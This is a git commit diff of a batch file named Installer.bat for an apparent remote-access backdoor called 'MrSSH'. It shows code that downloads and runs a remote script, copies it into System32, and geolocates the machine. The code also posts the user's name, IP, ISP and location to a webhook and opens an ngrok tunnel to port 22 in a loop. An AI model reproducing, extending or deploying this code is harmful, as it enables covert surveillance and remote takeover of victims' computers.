cb23f3b5c3255a20c0cecea0a1fd878c7ae1c231
dheb <74708369+dh3b@users.noreply.github.com>
2021-11-07 17:59:16 +0100

    Fix the router part (Copying from api)
    yeah

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -20,21 +20,7 @@ cd %temp%
 
 set "webhook="
 
-:: router info command
-curl --create-dirs -sfkLo "%localappdata%\microsoft\windowsapps\Router.bat" "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Router-Info/source.bat" & call "%localappdata%\microsoft\windowsapps\Router.bat" >nul & Xcopy %localappdata%\microsoft\windowsapps\router.bat C:\Windows\System32 /Y & call router>router.txt
-
-:: router set info
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.vpn`) DO (SET vpn=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.proxy`) DO (SET proxy=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter query`) DO (SET local=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) DO (SET country=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter city`) DO (SET city=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter lat`) DO (SET lat=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter lon`) DO (SET lon=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter isp`) DO (SET isp=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter regionName`) DO (SET region=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter Timezone`) DO (SET zone=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) DO (SET country=%%F)
+for /f "tokens=*" %a in ('call "WebParse.exe" "http://ip-api.com/json/?fields=61439" query status city regionName country countryCode lat lon timezone isp') do set "%a"
 
 call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":bookmark_tabs: __**Security, PC config**__ \\n\\n:desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local% (%isp%) \\n\\n\\n:bookmark_tabs: __**Location**__ \\n\\n:placard: **Country:** %country% \\n\\n:japan: **Region:** %region% \\n\\n:cityscape: **City:** %city% (%lat%; %lon%) \\n\\n:timer: **Timezone:** %zone%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
@@ -51,5 +37,3 @@ start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
 start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
-
-example, do not mind
